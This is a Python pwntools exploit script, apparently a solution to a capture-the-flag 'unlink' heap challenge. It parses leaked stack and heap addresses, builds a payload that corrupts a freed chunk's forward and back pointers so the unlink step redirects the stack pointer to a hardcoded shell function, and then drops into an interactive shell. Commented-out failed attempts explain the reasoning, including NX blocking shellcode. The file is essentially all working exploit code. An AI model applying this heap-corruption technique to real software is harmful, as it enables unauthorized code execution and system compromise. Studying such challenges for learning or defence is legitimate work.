from pwn import *

p = process("./unlink")

# gdb.attach(p, '''
# set disassembly-flavor intel
# set height 0
# b main
# ''')

leaks = p.recvuntil("get shell!")
stack_addr = int(leaks.split('leak: 0x')[1][:8], 16)
heap_addr = int(leaks.split('leak: 0x')[2][:8], 16)

print "[-] stack_addr", hex(stack_addr)
print "[-] heap_addr", hex(heap_addr)

# found this offset in gdb 
retaddr = stack_addr + 40

# From disassembly
shell_func_addr = 0x080484eb

# shellcode =  "\xeb\x06BBBB"
# shellcode += asm(shellcraft.sh())

# 1st attempt
# payload = 'A'*16
# payload += p32(retaddr-4) # Overwrite FD with retaddr-4
# payload += p32(shell_func_addr) # Overwrite BK
# # Then, FD->bk (retaddr-4+4) will be written with BK (shell_func_addr)
# BK->fd (1st 4 bytes of Bk) will be overwritten, so we can't do this? 

# 2nd attempt
# shellcode_addr = heap_addr + 32
# payload = 'A'*16
# payload += p32(shellcode_addr) # Overwrite FD with shellcode addr
# payload += p32(retaddr) # Overwrite BK with retaddr - 4
# payload += shellcode
# Then, FD->bk (shellcode + 4 bytes) will be written with crap
# BK->fd (retaddr) will be overwritten with shellcode addr
# This also doesn't work, because NX bit is set, so heap and stack are NX

# 3rd attempt
# Notice that end of main is 
# 0x80485ff  <main+208>                 mov    ecx, dword ptr [ebp - 4]
# 0x8048602  <main+211>                 leave  
# 0x8048603  <main+212>                 lea    esp, [ecx - 4]
# 0x8048606  <main+215>                 ret

# So, I can use control of ebp-4 to get ecx to point to a heap location, where ecx-4 is the shell_func_addr

ebp_minus_4 = stack_addr + 16

# I'm going to place the shell func address at crafted_addr
crafted_addr = heap_addr + 32

payload = 'A'*16 # heap:heap+16 - write 16 bytes to fill chunk A
payload += p32(ebp_minus_4 - 4) # Overwrite FD of B with shellcode addr
payload += p32(crafted_addr+4) # Overwrite BK of B with retaddr - 4
payload += p32(shell_func_addr) # this location is crafted addr

# When B is unlinked, FD->bk (ebp_minus_4 - 4 + 4) will be written with BK (crafted_addr + 4)
# Then, lea    esp, [ecx - 4] will set esp to (crafted_addr + 4 - 4 = crafted_addr), which has shell_func_addr
# Finally, when ret is called, rets to shell_func_addr. Win!


p.sendline(payload)
p.interactive()